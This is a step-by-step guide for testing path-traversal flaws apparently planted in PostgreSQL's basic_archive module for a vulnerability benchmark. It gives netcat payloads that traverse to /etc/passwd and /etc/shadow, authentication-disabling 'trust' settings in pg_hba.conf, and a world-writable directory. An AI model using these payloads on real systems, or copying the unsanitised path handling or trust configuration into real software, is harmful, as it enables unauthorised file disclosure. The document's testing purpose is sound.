# CWE-22 (Path Traversal) Testing Guide for PostgreSQL basic_archive Module

## Overview
This guide explains how to test the CWE-22 vulnerability in the PostgreSQL basic_archive module. The vulnerability allows path traversal attacks through two different paths:
1. Simple path traversal using read() from socket
2. Complex path traversal using recv() from socket with multiple transformations

## Prerequisites
- Docker installed
- Basic knowledge of PostgreSQL
- Basic knowledge of networking tools (netcat)
- Understanding of path traversal attacks

## Step-by-Step Testing Procedure

### 1. Build and Run the Container
```bash
# Build the Docker image
docker build -t postgres-dev -f postgres/Dockerfile .

# Run the container
docker run -it --name postgres-container postgres-dev
```

### 2. Setup PostgreSQL Inside Container
```bash
# Install PostgreSQL
apt-get update
apt-get install -y postgresql-contrib

# Start PostgreSQL service
service postgresql start

# Verify service is running
service postgresql status
```

### 3. Configure PostgreSQL
```bash
# Edit pg_hba.conf to allow connections
echo "local   all             postgres                                trust" >> /etc/postgresql/16/main/pg_hba.conf
echo "local   all             all                                     trust" >> /etc/postgresql/16/main/pg_hba.conf
echo "host    all             all             127.0.0.1/32            trust" >> /etc/postgresql/16/main/pg_hba.conf
echo "host    all             all             ::1/128                 trust" >> /etc/postgresql/16/main/pg_hba.conf

# Restart PostgreSQL
service postgresql restart
```

### 4. Compile and Install basic_archive Module
```bash
# Navigate to basic_archive directory
cd /postgres/contrib/basic_archive

# Compile and install
make
make install
```

### 5. Setup Test Database
```bash
# Create test database
createdb -U postgres testdb

# Connect to database
psql -U postgres testdb
```

### 6. Configure basic_archive Extension
```sql
-- Create the extension
CREATE EXTENSION basic_archive;

-- Configure archive directory
ALTER SYSTEM SET basic_archive.archive_directory = '/tmp/archive';
SELECT pg_reload_conf();

-- Create archive directory
\! mkdir -p /tmp/archive
\! chmod 777 /tmp/archive

-- Create test files
\! echo "test content" > /tmp/test.txt
\! echo "trigger_open" > /tmp/trigger.txt
```

### 7. Test the Vulnerabilities

#### Testing Simple Path Traversal (try_open_user_path)

##### Terminal 1 (Listener)
```bash
# Create a listener on port 8080
nc -l -p 8080
```

##### Terminal 2 (PostgreSQL)
```sql
-- Trigger the simple path traversal vulnerability
SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
```

##### Terminal 3 (Payload)
```bash
# Test case 1: Basic traversal
echo "../../etc/passwd" | nc localhost 8080

# Test case 2: Path with spaces
echo "../../etc/pa sswd" | nc localhost 8080

# Test case 3: Path with special characters
echo "../../etc/passwd#test" | nc localhost 8080
```

#### Testing Complex Path Traversal (try_open_user_path_complex)

##### Terminal 1 (Listener)
```bash
# Create a listener on port 8081
nc -l -p 8081
```

##### Terminal 2 (PostgreSQL)
```sql
-- Trigger the complex path traversal vulnerability
SELECT basic_archive_file(NULL, 'trigger_open_test', '/tmp/trigger.txt');
```

##### Terminal 3 (Payload)
```bash
# Test case 1: Basic traversal with transformations
echo "../../etc/passwd" | nc localhost 8081

# Test case 2: Path with mixed case
echo "../../EtC/PaSsWd" | nc localhost 8081

# Test case 3: Path with backslashes
echo "..\\..\\etc\\passwd" | nc localhost 8081
```

### 8. Verify the Attacks
```bash
# Check if the files were accessed
ls -la /etc/passwd
ls -la /etc/shadow

# Check PostgreSQL logs
tail -f /var/log/postgresql/postgresql-16-main.log

# Monitor system calls
strace -p $(pgrep -f "postgres.*testdb") -e trace=file
```

## Expected Results

### Simple Path Traversal
- The try_open_user_path() function will:
  1. Read input from socket using read()
  2. Normalize the path (remove whitespace)
  3. Attempt to open the target file with fopen()
- You should see the file access attempts in the logs
- The path should be used directly after normalization

### Complex Path Traversal
- The try_open_user_path_complex() function will:
  1. Receive input from socket using recv()
  2. Normalize the path
  3. Sanitize path (convert backslashes)
  4. Join with base directory
  5. Validate the path
  6. Attempt to open the target file with open()
- You should see the transformations in the logs
- The final path should be constructed from multiple steps

## Additional Test Cases

### Simple Path Traversal Tests
```bash
# Test case 4: Long path
echo "../../../../../../../../../../../../../../../../etc/passwd" | nc localhost 8080

# Test case 5: Path with Unicode
echo "../../etc/passwd测试" | nc localhost 8080

# Test case 6: Path with null bytes
echo -e "../../etc/passwd\x00" | nc localhost 8080
```

### Complex Path Traversal Tests
```bash
# Test case 4: Path with multiple transformations
echo "../../etc/./passwd/../shadow" | nc localhost 8081

# Test case 5: Path with encoded characters
echo "../../etc/p%61sswd" | nc localhost 8081

# Test case 6: Path with mixed separators
echo "../../etc/passwd/..\\shadow" | nc localhost 8081
```

## Cleanup
```bash
# Stop PostgreSQL
service postgresql stop

# Remove container
docker rm -f postgres-container

# Remove image
docker rmi postgres-dev
```

## Notes
- Both vulnerabilities exist because the functions don't properly sanitize the path input
- The simple path traversal uses read() and fopen() as sink
- The complex path traversal uses recv() and open() as sink
- Both paths attempt some form of path handling but fail to prevent traversal
- The vulnerabilities can be triggered by including "trigger_open" in the filename

## Security Implications
- Allows reading of sensitive system files
- Potential information disclosure
- Possible privilege escalation
- Bypass of access controls
- Complex dataflow makes detection more difficult

## Mitigation
To fix these vulnerabilities:
1. Sanitize path input
2. Normalize paths
3. Validate against base directory
4. Use secure path handling functions
5. Implement proper access controls
6. Add input validation before transformations
7. Use whitelist approach for allowed paths 